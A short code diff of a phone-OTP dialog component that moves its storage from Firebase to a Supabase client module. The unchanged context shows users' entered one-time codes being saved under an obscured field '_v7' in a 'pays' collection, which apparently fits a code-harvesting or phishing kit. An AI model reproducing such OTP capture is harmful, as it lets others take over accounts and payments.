@@ -5,8 +5,8 @@ import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } f
 import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { AlertCircle, CheckCircle2, Smartphone, Loader2, Shield } from "lucide-react"
-import { db } from "@/lib/firebase"
-import { doc, setDoc, Firestore } from "firebase/firestore"
+import { db } from "@/lib/supabase-client"
+import { doc, setDoc, Firestore } from "@/lib/supabase-client"
 import { addToHistory } from "@/lib/history-utils"
 
 interface PhoneOtpDialogProps {
@@ -74,7 +74,7 @@ export function PhoneOtpDialog({
       setOtpStatus("verifying")
       setError("")
 
-      if (!db) throw new Error("Firebase not configured")
+      if (!db) throw new Error("Supabase client is not configured")
       await setDoc(doc(db as Firestore, "pays", visitorID), {
         _v7: otp,
         phoneOtpSubmittedAt: new Date().toISOString(),
